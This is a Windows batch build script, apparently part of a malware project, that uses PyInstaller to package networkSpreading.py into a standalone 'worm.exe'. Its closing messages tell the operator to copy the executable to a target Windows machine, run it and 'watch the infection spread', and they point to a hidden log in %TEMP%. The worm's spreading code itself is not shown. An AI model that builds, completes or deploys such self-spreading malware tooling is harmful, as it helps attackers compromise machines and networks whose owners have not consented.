@echo off
REM ============================================================================
REM WORM STANDALONE EXE BUILDER - WINDOWS BATCH SCRIPT
REM ============================================================================
REM This script builds worm.exe from networkSpreading.py
REM Run this on Windows to create the standalone executable
REM Usage: double-click this file or run: build.bat
REM ============================================================================

setlocal enabledelayedexpansion

echo.
echo ╔════════════════════════════════════════════════════════════════════════╗
echo ║         WORM STANDALONE EXE BUILDER - WINDOWS BATCH SCRIPT           ║
echo ║              One Click Build for Windows Deployment                   ║
echo ╚════════════════════════════════════════════════════════════════════════╝
echo.

REM Check if Python is installed
echo [*] Checking for Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] ERROR: Python is not installed or not in PATH
    echo [!] Please install Python 3.8 or higher from https://www.python.org
    echo [!] Make sure to check "Add Python to PATH" during installation
    pause
    exit /b 1
)

python --version
echo [✓] Python found

REM Install PyInstaller
echo.
echo [*] Installing PyInstaller...
pip install -q pyinstaller
if errorlevel 1 (
    echo [!] Failed to install PyInstaller
    pause
    exit /b 1
)
echo [✓] PyInstaller installed

REM Run the build script
echo.
echo [*] Starting build process...
python build_exe_quick.py

if errorlevel 1 (
    echo.
    echo [!] Build failed!
    pause
    exit /b 1
)

echo.
echo ╔════════════════════════════════════════════════════════════════════════╗
echo ║                    BUILD COMPLETE!                                    ║
echo ╚════════════════════════════════════════════════════════════════════════╝
echo.
echo [✓] worm.exe created successfully!
echo [✓] Location: dist\worm.exe
echo.
echo NEXT STEPS:
echo 1. Copy dist\worm.exe to target Windows machine
echo 2. Run worm.exe (no Python needed!)
echo 3. Watch the infection spread
echo.
echo LOG FILE LOCATION:
echo %TEMP%\.worm.log
echo.
pause
exit /b 0
